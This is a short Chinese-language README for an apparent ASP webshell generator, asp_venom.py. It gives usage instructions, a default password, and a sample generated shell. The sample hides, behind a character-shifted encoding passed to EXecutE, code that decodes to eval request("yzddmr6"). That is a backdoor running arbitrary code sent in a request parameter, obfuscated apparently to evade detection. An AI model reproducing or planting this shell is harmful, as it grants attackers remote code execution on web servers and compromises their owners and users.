## 用法


`python3 asp_venom.py > test.asp`


即在当前目录下生成test.asp

## 默认密码:yzddmr6

可自行修改

## 生成样例:

```
<%
<!--
Function Hsnh(Bjhu):
	Bjhu = Split(Bjhu,"|")
	For x=1 To Ubound(Bjhu)
		Hsnh=Hsnh&Chr(Bjhu(x)-31)
	Next
End Function
EXecutE(Hsnh("|132|149|128|139|63|145|132|144|148|132|146|147|71|65|152|153|131|131|140|145|85|65|72"))
-->
%>
```
